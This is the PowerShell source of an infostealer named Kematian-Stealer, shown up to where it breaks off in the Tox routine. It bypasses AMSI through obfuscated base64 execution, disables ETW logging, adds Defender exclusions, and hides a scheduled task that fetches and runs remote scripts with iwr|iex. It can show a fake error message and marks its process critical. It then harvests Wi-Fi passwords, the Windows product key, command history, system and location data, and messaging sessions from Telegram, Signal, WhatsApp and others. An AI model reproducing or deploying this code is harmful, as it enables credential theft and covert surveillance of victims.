#$webhook = "YOUR_URL_HERE_SERVER" 
#$debug = $false
#$blockhostsfile = $false
#$criticalprocess = $false
#$melt = $false
#$fakeerror = $false
#$persistence = $false
#$write_disk_only = $false
#$vm_protect = $false
#$encryption_key = "YOUR_ENC_KEY_HERE"
$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

if ($debug) {
    $ProgressPreference = 'Continue'
}
else {
    $ErrorActionPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
}

# Load WPF assemblies
Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing

# Critical Process
function CriticalProcess {
    param ([Parameter(Mandatory=$true)][string]$MethodName,[Parameter(Mandatory=$true)][uint32]$IsCritical,[uint32]$Unknown1,[uint32]$Unknown2)
    [System.Diagnostics.Process]::EnterDebugMode() 
    $domain = [AppDomain]::CurrentDomain
    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule('DynamicModule')
    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
    [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
    [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
    [System.Runtime.InteropServices.CallingConvention]::Winapi,
    [System.Runtime.InteropServices.CharSet]::Ansi)
    $type = $typeBuilder.CreateType()
    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
    function InvokeRtlSetProcessIsCritical {
        param ([uint32]$isCritical,[uint32]$unknown1,[uint32]$unknown2)
        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
    }
    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
    } else {
        Write-Host "Unknown method name: $MethodName"
    }
}

function KDMUTEX {
    if ($fakeerror) {
        [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
    }
    $AppId = "62088a7b-ae9f-4802-827a-6e9c921cb48e"
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if (-not $CreatedNew) {
        throw "[!] An instance of this script is already running."
    }
    elseif ($criticalprocess -and -not $debug) {
        CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
    }
    Invoke-TASKS
}

# Request admin with AMSI bypass and ETW Disable
function CHECK_AND_PATCH {
    ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtlbWF0aWFuLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")) | &([regex]::Unescape("\u0069\u0065\u0078"))
    ([Reflection.Assembly]::LoadWithPartialName(('System.Core')).GetType(('System.Diagnostics.Eventing.EventProvider')).GetField(('m_enabled'), ('NonPublic,Instance')).SetValue([Ref].Assembly.GetType(('System.Management.Automation.Tracing.PSEtwLogProvider')).GetField(('etwProvider'), ('NonPublic,Static')).GetValue($null), 0))
    $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $kematiancheck
}

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
    if ($persistence) {
        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
        Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
        $KDOT_DIR = New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
        $KDOT_DIR.Attributes = "Hidden", "System"
        $task_name = "Kematian"
        $task_action = if ($debug) {
            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1'|iex`""
        }
        else {
            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1'|iex`",0)(window.close)"
        }
        $task_trigger = New-ScheduledTaskTrigger -AtLogOn
        $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force | Out-Null
        Write-Host "[!] Persistence Added" -ForegroundColor Green
    }
    if ($blockhostsfile) {
        $link = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
        iex (iwr -Uri $link -UseBasicParsing)
    }
    Backup-Data
}

function VMPROTECT {
    $link = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
    iex (iwr -uri $link -useb)
    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
}
if ($vm_protect) {
    VMPROTECT
}

function Request-Admin {
    while (-not (CHECK_AND_PATCH)) {
        if ($PSCommandPath -eq $null) {
            Write-Host "Please run the script with admin!" -ForegroundColor Red
            Start-Sleep -Seconds 5
            Exit 1
        }
        if ($debug -eq $true) {
            try { Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
        }
        else {
            try { Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
        } 
    }    
}

function Backup-Data {
    
    Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
    $timezone = Get-TimeZone
    $offsetHours = $timezone.BaseUtcOffset.Hours
    $timezoneString = "UTC$offsetHours"
    $filedate = Get-Date -Format "yyyy-MM-dd"
    $cc = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
    $countrycode = ($cc -split "`n" | ? { $_ -match '^loc=(.*)$' } | % { $Matches[1] })
    $folderformat = "$env:APPDATA\Kematian\$countrycode-($hostname)-($filedate)-($timezoneString)"

    $folder_general = $folderformat
    $folder_messaging = "$folderformat\Messaging Sessions"
    $folder_gaming = "$folderformat\Gaming Sessions"
    $folder_crypto = "$folderformat\Crypto Wallets"
    $folder_vpn = "$folderformat\VPN Clients"
    $folder_email = "$folderformat\Email Clients"
    $important_files = "$folderformat\Important Files"
    $browser_data = "$folderformat\Browser Data"
    $ftp_clients = "$folderformat\FTP Clients"
    $password_managers = "$folderformat\Password Managers" 

    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients, $password_managers)
    foreach ($folder in $folders) { if (Test-Path $folder) { Remove-Item $folder -Recurse -Force } }
    $folders | ForEach-Object {
        New-Item -ItemType Directory -Path $_ -Force | Out-Null
    }
    Write-Host "[!] Backup Directories Created" -ForegroundColor Green
	
    #bulk data (added build ID with banner)
    function Get-Network {
        $resp = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
        $ip = [regex]::Match($resp, 'ip=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)').Groups[1].Value
        $url = "http://ip-api.com/json"
        $hosting = (Invoke-WebRequest -Uri "http://ip-api.com/line/?fields=hosting" -useb).Content
        $response = Invoke-RestMethod -Uri $url -Method Get
        if (-not $response) {
            return "Not Found"
        }
        $country = $response.country
        $regionName = $response.regionName
        $city = $response.city
        $zip = $response.zip
        $lat = $response.lat
        $lon = $response.lon
        $isp = $response.isp
        return "IP: $ip `nCountry: $country `nRegion: $regionName `nCity: $city `nISP: $isp `nLatitude: $lat `nLongitude: $lon `nZip: $zip `nVPN/Proxy: $hosting"
    }

    $networkinfo = Get-Network
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = Get-Date -Format "r"
    $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
    $windowsVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    $buildNumber = $windowsVersion.CurrentBuild; $ubR = $windowsVersion.UBR; $osbuild = "$buildNumber.$ubR" 
    $displayversion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
    $mfg = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
    $model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
    $CPU = (Get-CimInstance -ClassName Win32_Processor).Name
    $corecount = (Get-CimInstance -ClassName Win32_Processor).NumberOfCores
    $GPU = (Get-CimInstance -ClassName Win32_VideoController).Name
    $total = (Get-CimInstance -ClassName Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
    $raminfo = "{0:N2} GB" -f $total
    $mac = (Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MACAddress -join ","
    
    # A cool banner 
    $guid = [Guid]::NewGuid()
    $guidString = $guid.ToString()
    $suffix = $guidString.Substring(0, 8)  
    $prefixedGuid = "Kematian-Stealer-" + $suffix
    $kematian_banner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZHilojilojilZcgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKVlyAgIOKWiOKWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilZcgICDilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZcgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyDilZENCuKVkeKWiOKWiOKVkSDilojilojilZTilZ3ilojilojilZTilZDilZDilZDilZDilZ3ilojilojilojilojilZcg4paI4paI4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWXICDilojilojilZEgICAg4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilZENCuKVkeKWiOKWiOKWiOKWiOKWiOKVlOKVnSDilojilojilojilojilojilZcgIOKWiOKWiOKVlOKWiOKWiOKWiOKWiOKVlOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVlyDilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWXICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilojilZHilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWU4pWd4pWRDQrilZHilojilojilZTilZDilojilojilZcg4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZHilZrilojilojilZTilZ3ilojilojilZHilojilojilZTilZDilZDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZTilZDilZDilojilojilZHilojilojilZHilZrilojilojilZfilojilojilZEgICAg4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZTilZDilZDilojilojilZHilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWRDQrilZHilojilojilZEgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSDilZrilZDilZ0g4paI4paI4pWR4paI4paI4pWRICDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSDilZrilojilojilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkeKVkQ0K4pWR4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gICAgIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAg4pWa4pWQ4pWdICAg4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVkOKVkOKVnSAgICDilZrilZDilZDilZDilZDilZDilZDilZ0gICDilZrilZDilZ0gICDilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWRDQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHR0cHM6Ly9naXRodWIuY29tL1NvbWFsaS1EZXZzL0tlbWF0aWFuLVN0ZWFsZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQ0K4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd")
    $kematian_strings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($kematian_banner))
    $kematian_info = "$kematian_strings `nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
    
    function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime

    function Get-InstalledAV {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery
        $AntivirusProduct.displayName
    }
    $avlist = Get-InstalledAV | Format-Table | Out-String
    
    $screen = wmic path Win32_VideoController get VideoModeDescription /format:csv | Select-String -Pattern "\d{3,4} x \d{3,4}" | ForEach-Object { $_.Matches.Value }

    $software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Format-Table -Wrap -AutoSize |
    Out-String

    $network = Get-NetAdapter |
    Select-Object Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium |
    Out-String

    $startupapps = Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User |
    Format-List |
    Out-String

    $runningapps = Get-WmiObject Win32_Process |
    Select-Object Name, Description, ProcessId, ThreadCount, Handles |
    Format-Table -Wrap -AutoSize |
    Out-String

    $services = Get-WmiObject Win32_Service |
    Where-Object State -eq "Running" |
    Select-Object Name, DisplayName |
    Sort-Object Name |
    Format-Table -Wrap -AutoSize |
    Out-String
    
    function diskdata {
        $disks = Get-WmiObject -Class "Win32_LogicalDisk" -Namespace "root\CIMV2" | Where-Object { $_.Size -gt 0 }
        $results = foreach ($disk in $disks) {
            try {
                $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
                $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
                $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
                $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
                $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
            }
            catch {
                $SizeOfDisk = 0
                $FreeSpace = 0
                $FreePercent = 0
                $usedspace = 0
                $usedpercent = 0
            }

            [PSCustomObject]@{
                Drive             = $disk.Name
                "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
            }
        }
        $results | Where-Object { $_.PSObject.Properties.Value -notcontains '' }
    }
    $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
    $alldiskinfo = $alldiskinfo.Trim()

    $info = "$kematian_info`n`n[Network] `n$networkinfo `n[Disk Info] `n$alldiskinfo `n`n[System] `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network Adapters] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
    $info | Out-File -FilePath "$folder_general\System.txt" -Encoding UTF8

    Function Get-WiFiInfo {
        $wifidir = "$env:tmp"
        New-Item -Path "$wifidir\wifi" -ItemType Directory -Force | Out-Null
        netsh wlan export profile folder="$wifidir\wifi" key=clear | Out-Null
        $xmlFiles = Get-ChildItem "$wifidir\wifi\*.xml"
        if ($xmlFiles.Count -eq 0) {
            return $false
        }
        $wifiInfo = @()
        foreach ($file in $xmlFiles) {
            [xml]$xmlContent = Get-Content $file.FullName
            $wifiName = $xmlContent.WLANProfile.SSIDConfig.SSID.name
            $wifiPassword = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
            $wifiAuth = $xmlContent.WLANProfile.MSM.security.authEncryption.authentication
            $wifiInfo += [PSCustomObject]@{
                SSID     = $wifiName
                Password = $wifiPassword
                Auth     = $wifiAuth
            }
        }
        $wifiInfo | Format-Table -AutoSize | Out-String
        $wifiInfo | Out-File -FilePath "$folder_general\WIFIPasswords.txt" -Encoding UTF8
    }
    $wifipasswords = Get-WiFiInfo 
    ri "$env:tmp\wifi" -Recurse -Force

    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        }
        catch {
            return "No product key found"
        }
    }
    Get-ProductKey > $folder_general\productkey.txt

    Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8 

    # All Messaging Sessions
    
    # Telegram 
    Write-Host "[!] Session Grabbing Started" -ForegroundColor Green
    function telegramstealer {
        $processname = "telegram"
        $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        if (!(Test-Path $pathtele)) { return }
        $telegramProcess = Get-Process -Name $processname -ErrorAction SilentlyContinue
        if ($telegramProcess) {
            $telegramPID = $telegramProcess.Id; $telegramPath = (gwmi Win32_Process -Filter "ProcessId = $telegramPID").CommandLine.split('"')[1]
            Stop-Process -Id $telegramPID -Force
        }
        $telegramsession = Join-Path $folder_messaging "Telegram"
        New-Item -ItemType Directory -Force -Path $telegramsession | Out-Null
        $items = Get-ChildItem -Path $pathtele
        foreach ($item in $items) {
            if ($item.GetType() -eq [System.IO.FileInfo]) {
                if (($item.Name.EndsWith("s") -and $item.Length -lt 200KB) -or
    ($item.Name.StartsWith("key_data") -or $item.Name.StartsWith("settings") -or $item.Name.StartsWith("configs") -or $item.Name.StartsWith("maps"))) {
                    Copy-Item -Path $item.FullName -Destination $telegramsession -Force 
                }
            }
            elseif ($item.GetType() -eq [System.IO.DirectoryInfo]) {
                if ($item.Name.Length -eq 16) {
                    $files = Get-ChildItem -Path $item.FullName -File             
                    foreach ($file in $files) {
                        if ($file.Name.EndsWith("s") -and $file.Length -lt 200KB) {
                            $destinationDirectory = Join-Path -Path $telegramsession -ChildPath $item.Name
                            if (-not (Test-Path -Path $destinationDirectory -PathType Container)) {
                                New-Item -ItemType Directory -Path $destinationDirectory | Out-Null 
                            }
                            Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force 
                        }
                    }
                }
            }
        }
        try { (Start-Process -FilePath $telegramPath) } catch {}   
    }
    telegramstealer

    # Element  
    function elementstealer {
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        if (!(Test-Path $elementfolder)) { return }
        $element_session = "$folder_messaging\Element"
        New-Item -ItemType Directory -Force -Path $element_session | Out-Null
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
    }
    elementstealer

    # ICQ  
    function icqstealer {
        $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
        if (!(Test-Path $icqfolder)) { return }
        $icq_session = "$folder_messaging\ICQ"
        New-Item -ItemType Directory -Force -Path $icq_session | Out-Null
        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
    }
    icqstealer

    # Signal  
    function signalstealer {
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        if (!(Test-Path $signalfolder)) { return }
        $signal_session = "$folder_messaging\Signal"
        New-Item -ItemType Directory -Force -Path $signal_session | Out-Null
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\attachments.noindex" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
    } 
    signalstealer


    # Viber  
    function viberstealer {
        $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
        if (!(Test-Path $viberfolder)) { return }
        $viber_session = "$folder_messaging\Viber"
        New-Item -ItemType Directory -Force -Path $viber_session | Out-Null
        $pattern = "^([\+|0-9][0-9.]{1,12})$"
        $directories = Get-ChildItem -Path $viberfolder -Directory | Where-Object { $_.Name -match $pattern }
        $rootFiles = Get-ChildItem -Path $viberfolder -File | Where-Object { $_.Name -match "(?i)\.db$|\.db-wal$" }
        foreach ($rootFile in $rootFiles) { Copy-Item -Path $rootFile.FullName -Destination $viber_session -Force }    
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Force        
            $files = Get-ChildItem -Path $directory.FullName -File -Recurse -Include "*.db", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
            foreach ($file in $files) {
                $destinationPathFiles = Join-Path -Path $destinationPath -ChildPath $file.Name
                Copy-Item -Path $file.FullName -Destination $destinationPathFiles -Force
            }
        }
    }
    viberstealer


    # Whatsapp  
    function whatsappstealer {
        $whatsapp_session = "$folder_messaging\Whatsapp"
        New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
        $regexPattern = "^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$"
        $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
        if ($parentFolder) {
            $localStateFolders = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
            foreach ($localStateFolder in $localStateFolders) {
                $profilePicturesFolder = Get-ChildItem -Path $localStateFolder.FullName -Filter "profilePictures" -Recurse -Directory
                if ($profilePicturesFolder) {
                    $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                    $profilePicturesDestination = Join-Path -Path $destinationPath -ChildPath "profilePictures"
                    Copy-Item -Path $profilePicturesFolder.FullName -Destination $profilePicturesDestination -Recurse -ErrorAction SilentlyContinue
                }
            }
            foreach ($localStateFolder in $localStateFolders) {
                $filesToCopy = Get-ChildItem -Path $localStateFolder.FullName -File | Where-Object { $_.Length -le 10MB -and $_.Name -match "(?i)\.db$|\.db-wal|\.dat$" }
                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                Copy-Item -Path $filesToCopy.FullName -Destination $destinationPath -Recurse 
            }
        }
    }
    whatsappstealer

    # Skype 
    function skype_stealer {
        $skypefolder = "$env:appdata\microsoft\skype for desktop"
        if (!(Test-Path $skypefolder)) { return }
        $skype_session = "$folder_messaging\Skype"
        New-Item -ItemType Directory -Force -Path $skype_session | Out-Null
        Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
    }
    skype_stealer
    
    
    # Pidgin 
    function pidgin_stealer {
        $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
        if (!(Test-Path $pidgin_folder)) { return }
        $pidgin_accounts = "$folder_messaging\Pidgin"
        New-Item -ItemType Directory -Force -Path $pidgin_accounts | Out-Null
        Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
    }
    pidgin_stealer
    
    # Tox 
    function tox_stealer {
